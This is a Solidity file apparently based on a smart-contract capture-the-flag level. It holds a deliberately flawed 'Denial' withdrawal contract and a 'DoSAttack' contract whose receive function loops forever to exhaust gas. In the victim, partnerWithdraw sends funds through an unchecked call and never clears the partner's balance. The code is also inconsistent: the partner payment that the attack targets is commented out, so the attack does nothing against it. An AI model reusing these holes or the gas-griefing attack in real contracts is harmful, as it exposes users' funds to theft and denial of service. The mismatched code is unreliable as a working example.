// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public owner;
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    constructor(address _owner) {
        owner = _owner;
    }

    function setWithdrawPartner(address _partner) public {
        require(msg.sender == owner, "invalid sender");
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        require(msg.sender == owner || msg.sender == partner, "invalid sender");

        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        // partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // slither-disable-next-line arbitrary-send-eth
    function partnerWithdraw() external {
        partner.call{value: withdrawPartnerBalances[partner]}("");
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract DoSAttack {
    Denial public denial;

    constructor(address _denial) {
        denial = Denial(payable(_denial));
    }

    function withdraw() external {
        denial.withdraw();
    }

    receive() external payable {
        while (true) {}
    }
}